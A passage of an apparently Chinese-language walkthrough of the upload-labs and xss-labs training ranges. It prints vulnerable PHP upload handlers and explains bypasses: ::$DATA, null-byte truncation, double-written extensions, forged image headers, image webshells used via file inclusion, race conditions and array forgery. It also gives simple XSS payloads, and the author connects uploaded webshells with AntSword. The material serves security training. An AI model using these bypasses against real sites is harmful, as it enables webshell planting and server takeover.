        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

可以看到这一关少了前几关中的` $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA`，所以可以使用`::$DATA`绕过

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021937853.png)



![null](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021937320.png)





### Pass-10-拼接路径
源代码：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');//获取文件扩展名
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;//拼接上传路径和文件名
            if (move_uploaded_file($temp_file, $img_path)) {//将临时文件移动到目标路径
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

**拼接路径原理解释：**

**举个生活化的例子：**

假设你有一个快递柜（上传目录），地址是 `/小区A/3号楼/快递柜/`。  
你规定所有快递必须放进这个柜子里。

但攻击者耍了个花招：  
他们在快递单上写 `../../小区大门/保安室/危险包裹`。  
快递员（代码）看到这个地址后，会这样拼接路径：`/小区A/3号楼/快递柜/../../小区大门/保安室/危险包裹`

这里的 `../` 相当于“后退一步”：

1. 从 `快递柜` 退到 `3号楼`（路径变成 `/小区A/3号楼/`）
2. 再退到 `小区A`（路径变成 `/小区A/`）
3. 最后拼上 `小区大门/保安室/危险包裹`，结果就是：  
`/小区A/小区大门/保安室/危险包裹`

于是，攻击者的危险包裹被放到了保安室（敏感目录），而不是快递柜！

---

**为什么会有这种问题？**

1. **代码的路径拼接逻辑**：  
你的代码直接信任用户输入的文件名，把上传目录（`UPLOAD_PATH`）和文件名（`$file_name`）拼在一起。  
如果文件名里藏了 `../`，路径就会被“绕”到其他目录。
2. **操作系统对路径的解析**：  
操作系统会自动解析 `../`，把它当成“返回上级目录”的指令。  
比如：  
`/var/www/uploads/../../` → 实际上等于 `/var/`（退了两层）

---

**攻击者会做什么？**

假设你的网站根目录是 `/var/www/html/`，攻击者可能：

1. 上传一个文件名 `../../html/shell.php`
2. 你的代码拼接后路径变成：  
`/var/www/uploads/../../html/shell.php` → 实际是 `/var/www/html/shell.php`
3. 攻击者通过访问 `http://你的网站.com/shell.php`，就能执行任意代码（比如删除数据库、窃取数据）。

---

**如何彻底解决？**

1. **禁止文件名中出现路径符号**：  
用 `basename()` 函数，直接砍掉所有路径部分，只保留纯文件名。

```php
$file_name = basename($_FILES['upload_file']['name']); // 无论用户输入什么路径，只取最后的文件名
```

**效果**：

    - 用户输入 `../../evil.php` → 处理后变成 `evil.php`
    - 路径固定为 `UPLOAD_PATH/evil.php`
2. **强制白名单文件类型**：  
只允许图片等安全类型（比如 `.jpg`, `.png`），禁止 `.php` 等可执行文件。

```php
$allow_ext = ['.jpg', '.png', '.gif']; // 只允许这些扩展名
if (!in_array($file_ext, $allow_ext)) {
    die("禁止上传！");
}
```

3. **重命名上传的文件**：  
用随机字符串重命名文件（如 `5f3d2a1.jpg`），让攻击者无法预测文件路径。

```php
$new_name = md5(uniqid()) . $file_ext; // 生成随机文件名
$img_path = UPLOAD_PATH . '/' . $new_name;
```





拼接路径，在文件名称后面加入`. .`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021938448.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021938522.png)



### Pass-11_双写绕过
```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess","ini");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

str_ireplace 函数是 PHP 中的一个不区分大小写的字符串替换函数。它用于在给定的字符串（或字符串数组）中，将所有匹配的搜索字符串替换为指定的替换字符串，且不区分大小写。

在这个代码中，会将黑名单里的文件名全部替换为空，但只替换一次，所以可以用双写绕过。





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021938525.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021943892.png)

### Pass-12_00截断绕过（POST）
第12关开始进入白名单



前提条件：

1.php版本小于5.3

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021943167.png)

2.配置文件中`php.ini`中的`magic_quotes_gpc = On`需要修改为`magic_quotes_gpc = Off`，**修改之后记得保存并重启**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021943579.png)

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

**00截断原理：**

关键使用了空字符

在url编码中空字符为`%00`

当传入文件时，用空字符截断文件名变成攻击性文件

例如：上传`example.php%00.jpg` 后在 URL 解码后会变成 `example.php\0.jpg`，当系统处理时`example.php\0.jpg` 会被文件系统保存为 `example.php`，从而达成目的。





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944287.png)

进行更改

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944140.png)

上传成功后复制链接到蚁剑

将%之后的去除

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944986.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944368.png)





### Pass-13_00截断绕过（GET)
```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

原理：

代码漏洞：

```php
$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
```

通过`strrpos`查找文件名中的最后一个`.`的位置来获取文件拓展名



那么我们将文件名构造为 `webshell.php .jpg`（注意中间的空格），然后在十六进制（HEX）视图中将空格（ASCII `20`）改为空字节（HEX `00`）。最终文件名变为 `webshell.php\x00.jpg`（`\x00` 表示空字节）。



并且由于 PHP 在底层使用 C 字符串处理函数，当遇到空字节 `\x00` 时，`strrpos` 会认为字符串在 `\x00` 处结束。



因此，原始文件名 `webshell.php\x00.jpg` 会被截断为 `webshell.php`。





bp抓包：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944333.png)

在upload后添加文件名`webshell.php`并且在此文件名后添加空格，选中空格后，在右边的窗口将空格的HAX值（20）改为空字符的HAX值（00）

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944248.png)

将文件后缀名改为白名单上的

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944699.png)

上传成功后复制链接到蚁剑，删除%以及后边的东西

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944193.png)

连接成功

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944440.png)





**对比 GET 和 POST 在 00 截断绕过中的区别**



| **对比项** | **GET 请求** | **POST 请求** |
| :--- | :---: | :---: |
| **参数位置** | 参数附加在 URL 中（如 `?file=test.php%00.jpg`）。 | 参数在 HTTP 请求体中（如表单字段 `filename="test.php%00.jpg"`）。 |
| **常见漏洞场景** | 路径遍历、文件包含（如 `include($_GET['file'])`）。 | 文件上传、路径拼接（如 `move_uploaded_file($tmp, $_POST['path'].$filename)`）。 |
| **绕过示例** | `http://example.com?file=shell.php%00.jpg` → 截断为 `shell.php`。 | 上传文件名 `shell.php\x00.jpg` → 保存为 `shell.php`。 |
| **防御难度** | 较难触发（需服务器允许 URL 中包含未编码的 `%00`）。 | 较易触发（请求体中的空字节可能直接被处理）。 |
| **实际利用频率** | 较低（现代框架/服务器默认过滤 URL 中的空字节）。 | 较高（文件上传功能中更常见，且空字节可能绕过扩展名检查）。 |


---

### Pass-14_图片马+文件包含漏洞
首先分析代码：

```php
function getReailFileType($filename){
    $file = fopen($filename, "rb");//使用fopen()函数以二进制模式（"rb"）打开指定的文件
    $bin = fread($file, 2); //只读2字节，这里只读取两个字节是因为不同的文件类型通常在其头部有独特的标识符（也称为“魔术数字”），这些标识符足以区分常见的文件格式
    fclose($file);
    $strInfo = @unpack("C2chars", $bin); //将读取的2个字节解包为两个无符号字符（C2chars 表示解包为2个字符）；@ 用于抑制可能的错误（如文件不足2字节时解包失败）   
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); //将两个字节拼接成一个整数   
    $fileType = '';    
    switch($typeCode){  //匹配文件类型    
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

**文件头字节与文件类型的对应关系：**

1.文字头：文字头是文件开头的几个字节，用来标识文件类型

JPEG 文件的前两个字节是 `FF D8`。

PNG 文件的前两个字节是 `89 50`。

GIF 文件的前两个字节是 `47 49`。（十六进制）

2.字节（Byte）：计算机中的最小存储单位

十六进制：`FF`、`D8`

十进制： `255`、`216`

二进制： `11111111`、`11011000`



以jpg文件类型举例：

jpg文件前俩个字节是`FF D8`，  代码中通过 `unpack("C2chars", $bin)` 将文件头的两个字节解包，解包后`$strInfo['chars1'] `是第一个字节（FF，即 255），`$strInfo['chars2']` 是第二个字节（D8，即 216）。  
通过 `intval($strInfo['chars1'].$strInfo['chars2'])` 将两个十进制数拼接成一个整数，得到 `255216`。最后根据`switch($typeCode)`函数匹配到jpg文件。



 因此我们更改上传的文件的文件头：



在最前面输入两个任意字母，方便后面修改

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021945869.png)



使用010editor打开，打开十六进制

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021945773.png)

将61,61改为FF,D8

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021945070.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022105108.png)

保存后上传

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952518.png)

上传后蚁剑还不能链接

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022056819.png)



接下来要用到文件包含漏洞

[文件包含漏洞全面详解-CSDN博客](https://blog.csdn.net/m0_46467017/article/details/126380415)





点击题目中的文件包含漏洞链接

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952122.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952242.png)



在新标签页打开图片找到图片链接

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952027.png)

记下文件名

```plain
upload/5420250209113757.jpg
```

文件包含漏洞：

```plain
?file=upload/+文件名称
```



```plain
?file=upload/5020250209113022.jpg
```

页面没有报错，就可以用这个url通过蚁剑连接

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022057235.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953063.png)





`.png`后缀：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953187.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953169.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953548.png)

`.gif`后缀：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953865.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953702.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953596.png)





三种后缀都上传成功才算过关！







### Pass-15_图片马
```php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

这一关中出现了`getimagesize（）`函数，`getimagesize()` 是 PHP 中一个用于获取图像文件信息的函数，它可以返回图像的尺寸、类型、MIME 类型等信息。

因此我们需要一张图片，将一句话木马写入图片里



随便打开一张图片：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953083.png)

将一句话木马写入最后，保存后上传。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022059295.png)



上传成功后同pass-14

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954792.png)

`.png`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954713.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954964.png)



### Pass-16-图片马
```php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

代码中要求开启php_exlf

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954919.png)



接下来同pass15

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954934.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954088.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954813.png)



### Pass-17_二次渲染
```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```



二次渲染是将原来的图片内容转换为另一种内容，这些内容有相同之处也有不同之处，所以我们在相同之处加入一句话木马即可



首先随便上传一张图片并找到，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954160.png)

使用010比较俩个文件

插入一句话木马

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954269.png)





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954569.png)















### Pass-18_条件竞争
```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```



这个代码中先上传后检查，于是我们可以利用上传到删除之间的时间去访问我们上传的文件，这就是条件竞争（满足特定环境条件）。





更改一下php文件

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954241.png)



发送PHP代码，并且用BP抓包  
直接发送到Intruder模块进行暴力重发

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954810.png)







发送过来后直接点击右侧清除（clean），然后点击上方的Payloads,按照如下设置

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954989.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955333.png)



接下来开始攻击，用另一个浏览器访问生成文件地址







### Pass-19-条件竞争+图片马
```php
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};
```



19关与18关相比，加入了图片马

在图片末尾加入木马

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955594.png)

上传图片并用bp抓包



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955741.png)

接下来同18关



















### Pass-20
```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955415.png)







![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955515.png)

### Pass-21
```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```



如果传入的内容是数组，那他不会进行检查，同时把数组中的第一个元素和最后一个元素通过点拼接成一个完整的文件名。

如果传入的内容不是数组，他会以点为分割，把名字和后缀分开，形成一个数组，数组中的第一个元素为文件名字，第二个元素为后缀名，再接着，它会对你数组中最后一个元素（也就是第二个元素后缀名）进行判断，如果不符合白名单上的内容，那就直接禁止了，如果允许，他会让数组中的第一个元素与最后一个元素通过点来结合，形成一个完整的文件名。

一切的根源都是保存的名称是不是数组，所以我们只需要伪造一个数组





首先上传php文件

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955560.png)



修改这一段

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955963.png)





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955255.png)

更改完之后放包，上传成功

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955086.png)



使用蚁剑链接

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955778.png)







# 2、xss-labs
XSS 的核心原理是 **攻击者通过输入恶意脚本，利用网站未过滤的漏洞，让浏览器执行这些脚本，从而实施攻击**。





#### level1_直接注入
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021955481.png)

查看源码：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956284.png)



当调用 `alert()` 时，实际上会执行以下操作：

1. 弹出一个确认对话框，显示消息“完成的不错！”。
2. 用户点击确认后，页面会重定向到 `level2.php`，并且传递一个查询参数 `keyword=test`。

直接在地址栏输入

```plain
name=<script>alert()</script>

```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956277.png)



#### level2_”>闭合绕过
先插入js尝试

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956109.png)





这里属于特殊符号被实体转义，所以`<script>alert()</script>`没有被实体转移

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021956812.png)

可以看到`<script>alert(1)</script>`被嵌套到value属性中，所以我们需要闭合input标签。

```plain
payload：
"><script>alert(1)</script>

```





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021957776.png)







#### level3_onfocus和οnclick
```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>

<title>欢迎来到level3</title>

</head>

<body>
